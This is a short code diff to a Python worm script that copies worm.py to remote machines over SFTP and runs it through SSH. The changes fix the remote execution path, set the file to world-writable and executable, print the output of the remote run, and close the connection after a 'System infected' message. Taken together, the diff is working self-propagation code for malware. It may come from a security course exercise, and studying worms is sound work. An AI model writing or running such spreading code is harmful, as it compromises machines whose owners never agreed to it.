@@ -57,8 +57,11 @@ def spreadAndExecute(sshClient):
 	# is very similar to that code.
 	sftpClient = sshClient.open_sftp()
 	sftpClient.put("worm.py", "/tmp/worm.py")
-	sshClient.exec_command("chmod a+x /tmp/worm.py")
-	sshClient.exec_command("python tmp/worm.py")
+	sftpClient.close()
+	sshClient.exec_command("chmod a+rwx /tmp/worm.py")
+	output = sshClient.exec_command("python /tmp/worm.py")[1]
+	for line in output:
+		print line	
 	pass
 
 
@@ -238,6 +241,7 @@ if len(sys.argv) <= 1:
 				except IOError:
 					print "This system should be infected"
 					spreadAndExecute(sshInfo[0])
+					sshInfo[0].close()
 					print "System infected"
 				#
 				#
